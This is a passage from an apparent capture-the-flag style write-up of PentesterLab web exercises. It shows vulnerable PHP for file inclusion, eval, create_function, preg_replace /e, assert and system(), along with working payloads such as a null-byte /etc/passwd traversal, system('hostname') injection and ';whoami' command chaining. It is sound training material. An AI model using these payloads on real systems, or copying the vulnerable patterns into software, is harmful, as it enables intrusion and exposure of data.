<p>The code gives the hint of exploiting this: the null byte, which will make the system ignore anything that comes after it. So the extension check will be bypassed: <code>file=../../../../../etc/passwd%00</code></p>

<h3>File Include</h3>

<p><strong>Example 1</strong></p>

<p><img class="center" src="http://chousensha.github.io/images/pentest/webpentester/fileinc.png" title="file includes" alt="file inclusion"></p>

<p>Let&rsquo;s see the code:</p>

<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
</pre></td><td class='code'><pre><code class='php'><span class='line'><span class="o">&lt;?</span><span class="nx">php</span>
</span><span class='line'>
</span><span class='line'>  <span class="k">if</span> <span class="p">(</span><span class="nv">$_GET</span><span class="p">[</span><span class="s2">&quot;page&quot;</span><span class="p">])</span> <span class="p">{</span>
</span><span class='line'>      <span class="k">include</span><span class="p">(</span><span class="nv">$_GET</span><span class="p">[</span><span class="s2">&quot;page&quot;</span><span class="p">]);</span>
</span><span class='line'>
</span><span class='line'>  <span class="p">}</span>
</span><span class='line'><span class="cp">?&gt;</span><span class="x"></span>
</span></code></pre></td></tr></table></div></figure>


<p>There is no validation performed on the file to be included. For this challenge, PentesterLab provides a sample include file that calls phpinfo() at <a href="http://assets.pentesterlab.com/test_include.txt">http://assets.pentesterlab.com/test_include.txt</a></p>

<p>Just include the above file to see the output of phpinfo(): <code>page=<a href="http://assets.pentesterlab.com/test_include.txt">http://assets.pentesterlab.com/test_include.txt</a></code></p>

<p><img class="center" src="http://chousensha.github.io/images/pentest/webpentester/phpinfo.png" title="phpinfo" alt="phpinfo output"></p>

<p><strong>Example2</strong></p>

<p>The URL is slightly different now: <a href="http://192.168.217.138/fileincl/example2.php?page=intro">http://192.168.217.138/fileincl/example2.php?page=intro</a></p>

<p>And the code:</p>

<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
</pre></td><td class='code'><pre><code class='php'><span class='line'><span class="o">&lt;?</span><span class="nx">php</span>
</span><span class='line'>  <span class="k">if</span> <span class="p">(</span><span class="nv">$_GET</span><span class="p">[</span><span class="s2">&quot;page&quot;</span><span class="p">])</span> <span class="p">{</span>
</span><span class='line'>    <span class="nv">$file</span> <span class="o">=</span> <span class="nv">$_GET</span><span class="p">[</span><span class="s2">&quot;page&quot;</span><span class="p">]</span><span class="o">.</span><span class="s2">&quot;.php&quot;</span><span class="p">;</span>
</span><span class='line'>    <span class="c1">// simulate null byte issue</span>
</span><span class='line'>    <span class="nv">$file</span> <span class="o">=</span> <span class="nb">preg_replace</span><span class="p">(</span><span class="s1">&#39;/\x00.*/&#39;</span><span class="p">,</span><span class="s2">&quot;&quot;</span><span class="p">,</span><span class="nv">$file</span><span class="p">);</span>
</span><span class='line'>      <span class="k">include</span><span class="p">(</span><span class="nv">$file</span><span class="p">);</span>
</span><span class='line'>  <span class="p">}</span>
</span><span class='line'><span class="cp">?&gt;</span><span class="x"></span>
</span></code></pre></td></tr></table></div></figure>


<p>So the code automatically appends a PHP extension to the file, but is also vulnerable to null bytes. I included the same file as in the previous example, with a <code>%00</code> at the end: <code>page=<a href="http://assets.pentesterlab.com/test_include.txt%00">http://assets.pentesterlab.com/test_include.txt%00</a></code></p>

<h3>Code injection</h3>

<p><strong>Example 1</strong></p>

<p><img class="center" src="http://chousensha.github.io/images/pentest/webpentester/code1.png" title="code injection" alt="code injection 1"></p>

<p>Source code:</p>

<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
</pre></td><td class='code'><pre><code class='php'><span class='line'><span class="o">&lt;?</span><span class="nx">php</span>
</span><span class='line'>  <span class="nv">$str</span><span class="o">=</span><span class="s2">&quot;echo </span><span class="se">\&quot;</span><span class="s2">Hello &quot;</span><span class="o">.</span><span class="nv">$_GET</span><span class="p">[</span><span class="s1">&#39;name&#39;</span><span class="p">]</span><span class="o">.</span><span class="s2">&quot;!!!</span><span class="se">\&quot;</span><span class="s2">;&quot;</span><span class="p">;</span>
</span><span class='line'>
</span><span class='line'>  <span class="k">eval</span><span class="p">(</span><span class="nv">$str</span><span class="p">);</span>
</span><span class='line'><span class="cp">?&gt;</span><span class="x"></span>
</span></code></pre></td></tr></table></div></figure>


<p>The string <code>echo &ldquo;Hello hacker!!!&rdquo;;</code> is passed to eval. Whatever else we input after the name variable comes right after hacker and before the exclamation signs: Hello hacker@!!! (with an example of adding @ after hacker). However, if we input a double-quote, we get an error:</p>

<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>Parse error: syntax error, unexpected '!', expecting ',' or ';' in /var/www/codeexec/example1.php(6) : eval()'d code on line 1 </span></code></pre></td></tr></table></div></figure>


<p>That is because eval now has to evaluate the broken syntax of <code>echo &ldquo;Hello hacker&rdquo;!!!&ldquo;;</code>. We can take advantage of this by appending a command and then commenting out the remaining <code>!!!&rdquo;;</code>:</p>

<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>name=hacker" . system('hostname');//</span></code></pre></td></tr></table></div></figure>


<p>URL encode it and you will see the output:</p>

<p><img class="center" src="http://chousensha.github.io/images/pentest/webpentester/codeinj1.png" title="code injection" alt="code injection 1 success"></p>

<p>This worked because what eval saw was: <code>echo &ldquo;Hello hacker&rdquo; . system(&lsquo;hostname&rsquo;);//!!!&ldquo;;</code></p>

<p><strong>Example 2</strong></p>

<p><img class="center" src="http://chousensha.github.io/images/pentest/webpentester/code2.png" title="code injection" alt="code injection 2"></p>

<p>PHP code:</p>

<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
<span class='line-number'>11</span>
<span class='line-number'>12</span>
<span class='line-number'>13</span>
<span class='line-number'>14</span>
<span class='line-number'>15</span>
<span class='line-number'>16</span>
<span class='line-number'>17</span>
<span class='line-number'>18</span>
<span class='line-number'>19</span>
<span class='line-number'>20</span>
<span class='line-number'>21</span>
<span class='line-number'>22</span>
<span class='line-number'>23</span>
<span class='line-number'>24</span>
<span class='line-number'>25</span>
<span class='line-number'>26</span>
<span class='line-number'>27</span>
<span class='line-number'>28</span>
<span class='line-number'>29</span>
<span class='line-number'>30</span>
<span class='line-number'>31</span>
<span class='line-number'>32</span>
<span class='line-number'>33</span>
<span class='line-number'>34</span>
<span class='line-number'>35</span>
<span class='line-number'>36</span>
<span class='line-number'>37</span>
<span class='line-number'>38</span>
<span class='line-number'>39</span>
<span class='line-number'>40</span>
<span class='line-number'>41</span>
<span class='line-number'>42</span>
<span class='line-number'>43</span>
</pre></td><td class='code'><pre><code class='php'><span class='line'><span class="o">&lt;?</span><span class="nx">php</span>
</span><span class='line'><span class="k">class</span> <span class="nc">User</span><span class="p">{</span>
</span><span class='line'>  <span class="k">public</span> <span class="nv">$id</span><span class="p">,</span> <span class="nv">$name</span><span class="p">,</span> <span class="nv">$age</span><span class="p">;</span>
</span><span class='line'>  <span class="k">function</span> <span class="nf">__construct</span><span class="p">(</span><span class="nv">$id</span><span class="p">,</span> <span class="nv">$name</span><span class="p">,</span> <span class="nv">$age</span><span class="p">){</span>
</span><span class='line'>    <span class="nv">$this</span><span class="o">-&gt;</span><span class="na">name</span><span class="o">=</span> <span class="nv">$name</span><span class="p">;</span>
</span><span class='line'>    <span class="nv">$this</span><span class="o">-&gt;</span><span class="na">age</span> <span class="o">=</span> <span class="nv">$age</span><span class="p">;</span>
</span><span class='line'>    <span class="nv">$this</span><span class="o">-&gt;</span><span class="na">id</span> <span class="o">=</span> <span class="nv">$id</span><span class="p">;</span>
</span><span class='line'>  <span class="p">}</span>
</span><span class='line'><span class="p">}</span>
</span><span class='line'>  <span class="k">require_once</span><span class="p">(</span><span class="s1">&#39;../header.php&#39;</span><span class="p">);</span>
</span><span class='line'>  <span class="k">require_once</span><span class="p">(</span><span class="s1">&#39;../sqli/db.php&#39;</span><span class="p">);</span>
</span><span class='line'>  <span class="nv">$sql</span> <span class="o">=</span> <span class="s2">&quot;SELECT * FROM users &quot;</span><span class="p">;</span>
</span><span class='line'>
</span><span class='line'>  <span class="nv">$order</span> <span class="o">=</span> <span class="nv">$_GET</span><span class="p">[</span><span class="s2">&quot;order&quot;</span><span class="p">];</span>
</span><span class='line'>  <span class="nv">$result</span> <span class="o">=</span> <span class="nb">mysql_query</span><span class="p">(</span><span class="nv">$sql</span><span class="p">);</span>
</span><span class='line'>  <span class="k">if</span> <span class="p">(</span><span class="nv">$result</span><span class="p">)</span> <span class="p">{</span>
</span><span class='line'>      <span class="k">while</span> <span class="p">(</span><span class="nv">$row</span> <span class="o">=</span> <span class="nb">mysql_fetch_assoc</span><span class="p">(</span><span class="nv">$result</span><span class="p">))</span> <span class="p">{</span>
</span><span class='line'>      <span class="nv">$users</span><span class="p">[]</span> <span class="o">=</span> <span class="k">new</span> <span class="nx">User</span><span class="p">(</span><span class="nv">$row</span><span class="p">[</span><span class="s1">&#39;id&#39;</span><span class="p">],</span><span class="nv">$row</span><span class="p">[</span><span class="s1">&#39;name&#39;</span><span class="p">],</span><span class="nv">$row</span><span class="p">[</span><span class="s1">&#39;age&#39;</span><span class="p">]);</span>
</span><span class='line'>    <span class="p">}</span>
</span><span class='line'>    <span class="k">if</span> <span class="p">(</span><span class="nb">isset</span><span class="p">(</span><span class="nv">$order</span><span class="p">))</span> <span class="p">{</span>
</span><span class='line'>      <span class="nb">usort</span><span class="p">(</span><span class="nv">$users</span><span class="p">,</span> <span class="nb">create_function</span><span class="p">(</span><span class="s1">&#39;$a, $b&#39;</span><span class="p">,</span> <span class="s1">&#39;return strcmp($a-&gt;&#39;</span><span class="o">.</span><span class="nv">$order</span><span class="o">.</span><span class="s1">&#39;,$b-&gt;&#39;</span><span class="o">.</span><span class="nv">$order</span><span class="o">.</span><span class="s1">&#39;);&#39;</span><span class="p">));</span>
</span><span class='line'>    <span class="p">}</span>
</span><span class='line'>  <span class="p">}</span>
</span><span class='line'>
</span><span class='line'>      <span class="cp">?&gt;</span><span class="x"></span>
</span><span class='line'><span class="x">&lt;table class=&#39;table table-striped&#39; &gt;</span>
</span><span class='line'><span class="x">      &lt;tr&gt;</span>
</span><span class='line'><span class="x">          &lt;th&gt;&lt;a href=&quot;example2.php?order=id&quot;&gt;id&lt;/th&gt;</span>
</span><span class='line'><span class="x">          &lt;th&gt;&lt;a href=&quot;example2.php?order=name&quot;&gt;name&lt;/th&gt;</span>
</span><span class='line'><span class="x">          &lt;th&gt;&lt;a href=&quot;example2.php?order=age&quot;&gt;age&lt;/th&gt;</span>
</span><span class='line'><span class="x">      &lt;/tr&gt;</span>
</span><span class='line'><span class="x">      </span><span class="cp">&lt;?php</span>
</span><span class='line'>
</span><span class='line'>    <span class="k">foreach</span> <span class="p">(</span><span class="nv">$users</span> <span class="k">as</span> <span class="nv">$user</span><span class="p">)</span> <span class="p">{</span>
</span><span class='line'>          <span class="k">echo</span> <span class="s2">&quot;&lt;tr&gt;&quot;</span><span class="p">;</span>
</span><span class='line'>              <span class="k">echo</span> <span class="s2">&quot;&lt;td&gt;&quot;</span><span class="o">.</span><span class="nv">$user</span><span class="o">-&gt;</span><span class="na">id</span><span class="o">.</span><span class="s2">&quot;&lt;/td&gt;&quot;</span><span class="p">;</span>
</span><span class='line'>              <span class="k">echo</span> <span class="s2">&quot;&lt;td&gt;&quot;</span><span class="o">.</span><span class="nv">$user</span><span class="o">-&gt;</span><span class="na">name</span><span class="o">.</span><span class="s2">&quot;&lt;/td&gt;&quot;</span><span class="p">;</span>
</span><span class='line'>              <span class="k">echo</span> <span class="s2">&quot;&lt;td&gt;&quot;</span><span class="o">.</span><span class="nv">$user</span><span class="o">-&gt;</span><span class="na">age</span><span class="o">.</span><span class="s2">&quot;&lt;/td&gt;&quot;</span><span class="p">;</span>
</span><span class='line'>          <span class="k">echo</span> <span class="s2">&quot;&lt;/tr&gt;&quot;</span><span class="p">;</span>
</span><span class='line'>      <span class="p">}</span>    
</span><span class='line'>      <span class="k">echo</span> <span class="s2">&quot;&lt;/table&gt;&quot;</span><span class="p">;</span>
</span><span class='line'>  <span class="k">require</span> <span class="s1">&#39;../footer.php&#39;</span><span class="p">;</span>
</span><span class='line'><span class="cp">?&gt;</span><span class="x"></span>
</span></code></pre></td></tr></table></div></figure>


<p>The line to focus on is:</p>

<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
</pre></td><td class='code'><pre><code class='php'><span class='line'><span class="nb">usort</span><span class="p">(</span><span class="nv">$users</span><span class="p">,</span> <span class="nb">create_function</span><span class="p">(</span><span class="s1">&#39;$a, $b&#39;</span><span class="p">,</span> <span class="s1">&#39;return strcmp($a-&gt;&#39;</span><span class="o">.</span><span class="nv">$order</span><span class="o">.</span><span class="s1">&#39;,$b-&gt;&#39;</span><span class="o">.</span><span class="nv">$order</span><span class="o">.</span><span class="s1">&#39;);&#39;</span><span class="p">));</span>
</span></code></pre></td></tr></table></div></figure>


<p>Here, the <a href="https://www.pentesterlab.com/exercises/web_for_pentester/course">PentesterLab course</a> explains the vulnerability exists in the <a href="https://secure.php.net/manual/en/function.usort.php">usort(array, user-defined function)</a> function, because it uses <a href="https://secure.php.net/manual/en/function.create-function.php">create_function(args, code)</a>, which is used to create an anonymous (lambda-style) function. <strong>create_function</strong> is vulnerable to unfiltered input because it uses eval() at its core. There is a known <a href="http://www.exploitalert.com/view-details.html?id=10264">exploit</a> that allows code injection and executing the code without creating and calling the function. Let&rsquo;s see how this works:</p>

<p><strong>create_function</strong> is a ZEND_FUNCTION defined in <em>zend_builtin_functions.c</em>. Here is part of the vulnerable code:</p>

<p><img class="center" src="http://chousensha.github.io/images/pentest/webpentester/ffs.png" title="c code" alt="vulnerable code"></p>

<p>The folks at PentesterLab were nice enough to help me understand this, I was in one of those states where you don&rsquo;t see the forest from the trees! Basically, the code for the lambda function is the string inside curly brackets, and there is no filtering for {}. So later, this same user-supplied string gets evaluated by zend_eval_string. We can inject code in the $order parameter, so our code gets in this line:</p>

<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
</pre></td><td class='code'><pre><code class='php'><span class='line'><span class="nb">usort</span><span class="p">(</span><span class="nv">$users</span><span class="p">,</span> <span class="nb">create_function</span><span class="p">(</span><span class="s1">&#39;$a, $b&#39;</span><span class="p">,</span> <span class="s1">&#39;return strcmp($a-&gt;&#39;</span><span class="o">.</span><span class="nv">$order</span><span class="o">.</span><span class="s1">&#39;,$b-&gt;&#39;</span><span class="o">.</span><span class="nv">$order</span><span class="o">.</span><span class="s1">&#39;);&#39;</span><span class="p">));</span>
</span></code></pre></td></tr></table></div></figure>


<p>And that line will be used in the format string. The payload I used is : <code>order=id);}echo &lsquo;INJECTION SUCCESSFUL&rsquo;;//</code>. Now, inside eval(), the lambda function without injection looks something like this:</p>

<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>function LAMBDA_TEMP_FUNCNAME (a,b){return strcmp($a-&gt;'.$order.',$b-&gt;'.$order.');}</span></code></pre></td></tr></table></div></figure>


<p>Let&rsquo;s deconstruct it step by step. Adding <strong>);</strong> closes the call to strcmp, but leaves garbage behind and also an unclosed {} , because the end curly bracket is now part of the discarded code:</p>

<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>function LAMBDA_TEMP_FUNCNAME (a,b){return strcmp($a-&gt;'.$order.');,$b-&gt;'.$order.');}</span></code></pre></td></tr></table></div></figure>


<p>Adding a closing curly bracket correctly closes the format string, so now we have:</p>

<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>function LAMBDA_TEMP_FUNCNAME (a,b){return strcmp($a-&gt;'.$order.');},$b-&gt;'.$order.');}</span></code></pre></td></tr></table></div></figure>


<p>To test where I was with the injection, I left it at that and got this error:</p>

<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>Parse error: syntax error, unexpected ',' in /var/www/codeexec/example2.php(22) : runtime-created function on line 1 Warning: usort() expects parameter 2 to be a valid callback, no array or string given in /var/www/codeexec/example2.php on line 22 </span></code></pre></td></tr></table></div></figure>


<p>So the code picks up after the curly bracket, we know we have to comment out the rest. And between the curly bracket and the comment characters we can put our code:</p>

<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>function LAMBDA_TEMP_FUNCNAME (a,b){return strcmp($a-&gt;'.$order.');}echo 'INJECTION SUCCESSFUL';//,$b-&gt;'.$order.');}</span></code></pre></td></tr></table></div></figure>


<p>And the result:</p>

<p><img class="center" src="http://chousensha.github.io/images/pentest/webpentester/codeinj2.png" title="code injection 2" alt="code injection"></p>

<p>eval() now sees a strcmp, which is executed (but only with 1 parameter, hence the warning). Then eval goes further, sees our code and executes it (the warning doesn&rsquo;t stop the execution). And finally, eval reaches the leftovers, which have been commented out, so it does nothing.</p>

<p>This here was my favorite part in all the challenge!</p>

<p><strong>Example 3</strong></p>

<p>Here we have the familiar hello hacker message, but with a twist on the URL: <a href="http://192.168.217.138/codeexec/example3.php?new=hacker&amp;pattern=/lamer/&amp;base=Hello%20lamer">http://192.168.217.138/codeexec/example3.php?new=hacker&amp;pattern=/lamer/&amp;base=Hello%20lamer</a></p>

<p>Let&rsquo;s see the code:</p>

<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
</pre></td><td class='code'><pre><code class='php'><span class='line'><span class="o">&lt;?</span><span class="nx">php</span>
</span><span class='line'>  <span class="k">echo</span> <span class="nb">preg_replace</span><span class="p">(</span><span class="nv">$_GET</span><span class="p">[</span><span class="s2">&quot;pattern&quot;</span><span class="p">],</span> <span class="nv">$_GET</span><span class="p">[</span><span class="s2">&quot;new&quot;</span><span class="p">],</span> <span class="nv">$_GET</span><span class="p">[</span><span class="s2">&quot;base&quot;</span><span class="p">]);</span>
</span><span class='line'>
</span><span class='line'><span class="cp">?&gt;</span><span class="x"></span>
</span></code></pre></td></tr></table></div></figure>


<p>Ok, preg_replace searches inside the base parameter (Hello lamer) for matches to the pattern parameter (hacker) and replaces them with what&rsquo;s in the new parameter (hacker).</p>

<p>The problem with preg_replace is that it can be passed the modifier <a href="https://secure.php.net/manual/en/reference.pcre.pattern.modifiers.php#reference.pcre.pattern.modifiers.eval">e (PREG_REPLACE_EVAL)</a> that causes PHP to <a href="https://bitquark.co.uk/blog/2013/07/23/the_unexpected_dangers_of_preg_replace">execute the replacement value</a>.</p>

<p>To exploit this, first we have to add the modifier to the pattern: <code>pattern=/lamer/e</code>. Then we put our code inside the new parameter: <code>new=phpinfo()</code>. The URL now looks like this: <a href="http://192.168.217.138/codeexec/example3.php?new=phpinfo%28%29&amp;pattern=/lamer/e&amp;base=Hello%20lamer">http://192.168.217.138/codeexec/example3.php?new=phpinfo%28%29&amp;pattern=/lamer/e&amp;base=Hello%20lamer</a></p>

<p><img class="center" src="http://chousensha.github.io/images/pentest/webpentester/phpinfo.png" title="phpinfo" alt="phpinfo output"></p>

<p><strong>Example 4</strong></p>

<p>This one looks like the first example, but with a new addition in the code:</p>

<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
</pre></td><td class='code'><pre><code class='php'><span class='line'><span class="c1">// ensure name is not empty </span>
</span><span class='line'><span class="nb">assert</span><span class="p">(</span><span class="nx">trim</span><span class="p">(</span><span class="s2">&quot;&#39;&quot;</span><span class="o">.</span><span class="nv">$_GET</span><span class="p">[</span><span class="s1">&#39;name&#39;</span><span class="p">]</span><span class="o">.</span><span class="s2">&quot;&#39;&quot;</span><span class="p">));</span>
</span><span class='line'><span class="k">echo</span> <span class="s2">&quot;Hello &quot;</span><span class="o">.</span><span class="nb">htmlentities</span><span class="p">(</span><span class="nv">$_GET</span><span class="p">[</span><span class="s1">&#39;name&#39;</span><span class="p">]);</span>
</span></code></pre></td></tr></table></div></figure>


<p><a href="https://secure.php.net/manual/ro/function.assert.php">assert</a> checks if the assertions is false, but the most important thing that we need to know is: <strong>if the assertion is given as a string it will be evaluated as PHP code by assert()</strong>.</p>

<p>The assert returns true, because it checks that the name parameter = &lsquo;hacker&rsquo;, which it is. When injecting a single quote, we see this error:</p>

<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>Parse error: syntax error, unexpected T_ENCAPSED_AND_WHITESPACE in /var/www/codeexec/example4.php(4) : assert code on line 1 Catchable fatal error: assert(): Failure evaluating code: 'hacker'' in /var/www/codeexec/example4.php on line 4 </span></code></pre></td></tr></table></div></figure>


<p>I used a PHP sandbox to help me with this. Let&rsquo;s imagine that the name parameter is a simple string with the value of hacker:</p>

<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
</pre></td><td class='code'><pre><code class='php'><span class='line'><span class="nv">$name</span> <span class="o">=</span> <span class="s1">&#39;hacker&#39;</span><span class="p">;</span>
</span></code></pre></td></tr></table></div></figure>


<p>Thanks to the use of trim, assert will see (and try to evaluate) the value of &lsquo;hacker&rsquo;. Knowing this, if I try injecting <code>hacker'.phpinfo().&lsquo;</code>, inside the code I assume it will look like this:</p>

<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
</pre></td><td class='code'><pre><code class='php'><span class='line'><span class="nv">$name</span> <span class="o">=</span> <span class="s1">&#39;hacker&#39;</span><span class="o">.</span><span class="nb">phpinfo</span><span class="p">()</span><span class="o">.</span><span class="s1">&#39;&#39;</span><span class="p">;</span>
</span></code></pre></td></tr></table></div></figure>


<p>With the string concatenation, phpinfo() is displayed, but we also see at the bottom of the page: <code>Hello hacker'.phpinfo().&lsquo;</code>. The assert was successful, and the code was executed.</p>

<h3>Commands injection</h3>

<p><strong>Example 1</strong></p>

<p><img class="center" src="http://chousensha.github.io/images/pentest/webpentester/cmd1.png" title="cmd injection" alt="ping"></p>

<p>It looks like a ping program:</p>

<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
</pre></td><td class='code'><pre><code class='php'><span class='line'><span class="o">&lt;?</span><span class="nx">php</span>
</span><span class='line'>  <span class="nb">system</span><span class="p">(</span><span class="s2">&quot;ping -c 2 &quot;</span><span class="o">.</span><span class="nv">$_GET</span><span class="p">[</span><span class="s1">&#39;ip&#39;</span><span class="p">]);</span>
</span><span class='line'><span class="cp">?&gt;</span><span class="x"></span>
</span></code></pre></td></tr></table></div></figure>


<p>You can chain another command after the ping one by doing this: <code>ip=127.0.0.1;whoami</code>. Below the ping output, you can now see the whoami output, which in this case is www-data</p>

<p><strong>Example 2</strong></p>

<p>This looks the same like the previous one, but let&rsquo;s see the code:</p>

<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
</pre></td><td class='code'><pre><code class='php'><span class='line'><span class="o">&lt;?</span><span class="nx">php</span>
</span><span class='line'>  <span class="k">if</span> <span class="p">(</span><span class="o">!</span><span class="p">(</span><span class="nb">preg_match</span><span class="p">(</span><span class="s1">&#39;/^\d{1,3}\.\d{1,3}\.\d{1,3}.\d{1,3}$/m&#39;</span><span class="p">,</span> <span class="nv">$_GET</span><span class="p">[</span><span class="s1">&#39;ip&#39;</span><span class="p">])))</span> <span class="p">{</span>
</span><span class='line'>     <span class="k">die</span><span class="p">(</span><span class="s2">&quot;Invalid IP address&quot;</span><span class="p">);</span>
</span><span class='line'>  <span class="p">}</span>
</span><span class='line'>  <span class="nb">system</span><span class="p">(</span><span class="s2">&quot;ping -c 2 &quot;</span><span class="o">.</span><span class="nv">$_GET</span><span class="p">[</span><span class="s1">&#39;ip&#39;</span><span class="p">]);</span>
</span><span class='line'><span class="cp">?&gt;</span><span class="x"></span>
</span></code></pre></td></tr></table></div></figure>


<p>There is some regex added now to validate that the ip parameter will indeed look like in IP. However, similar to a previous example, the check won&rsquo;t look on further lines. We can use <code>%0a</code> to introduce a new line, and run our command there: <code>ip=127.0.0.1%0Apwd</code>. And the output is:</p>

<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>PING 127.0.0.1 (127.0.0.1) 56(84) bytes of data.
</span><span class='line'>64 bytes from 127.0.0.1: icmp_req=1 ttl=64 time=0.012 ms
</span><span class='line'>64 bytes from 127.0.0.1: icmp_req=2 ttl=64 time=0.022 ms
</span><span class='line'>
</span><span class='line'>--- 127.0.0.1 ping statistics ---
</span><span class='line'>2 packets transmitted, 2 received, 0% packet loss, time 999ms
</span><span class='line'>rtt min/avg/max/mdev = 0.012/0.017/0.022/0.005 ms
</span><span class='line'>/var/www/commandexec</span></code></pre></td></tr></table></div></figure>


<p><strong>Example 3</strong></p>

<p>Same-looking URL, and slightly different code:</p>

<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
</pre></td><td class='code'><pre><code class='php'><span class='line'><span class="o">&lt;?</span><span class="nx">php</span>
</span><span class='line'>  <span class="k">if</span> <span class="p">(</span><span class="o">!</span><span class="p">(</span><span class="nb">preg_match</span><span class="p">(</span><span class="s1">&#39;/^\d{1,3}\.\d{1,3}\.\d{1,3}.\d{1,3}$/&#39;</span><span class="p">,</span> <span class="nv">$_GET</span><span class="p">[</span><span class="s1">&#39;ip&#39;</span><span class="p">])))</span> <span class="p">{</span>
</span><span class='line'>     <span class="nx">header</span><span class="p">(</span><span class="s2">&quot;Location: example3.php?ip=127.0.0.1&quot;</span><span class="p">);</span>
</span><span class='line'>  <span class="p">}</span>
</span><span class='line'>  <span class="nb">system</span><span class="p">(</span><span class="s2">&quot;ping -c 2 &quot;</span><span class="o">.</span><span class="nv">$_GET</span><span class="p">[</span><span class="s1">&#39;ip&#39;</span><span class="p">]);</span>
</span><span class='line'><span class="cp">?&gt;</span><span class="x"></span>
</span></code></pre></td></tr></table></div></figure>


<p>This time, the script will redirect the user if the ip parameter doesn&rsquo;t match the regex. However, the execution will continue, even if the browser gets redirected. To stop the execution altogether, it would be necessary to call the <em>die()</em> function after the <em>header()</em> function, which isn&rsquo;t happening in this case. So we can still inject a command, but we&rsquo;ll need to do it through another medium than the browser, or use a proxy. For this, I used Burp, sent the payload <code>ip=127.0.0.1;ls</code>, and looked inside the 302 response to find what I wanted to see:</p>

<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>example1.php
</span><span class='line'>example2.php
</span><span class='line'>example3.php
</span><span class='line'>index.html</span></code></pre></td></tr></table></div></figure>


<h3>LDAP attacks</h3>

<p><strong>Example 1</strong></p>

<p><img class="center" src="http://chousensha.github.io/images/pentest/webpentester/ldap1.png" title="ldap" alt="ldap 1"></p>

<p>This is a new type of exercise, involving LDAP:</p>

<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
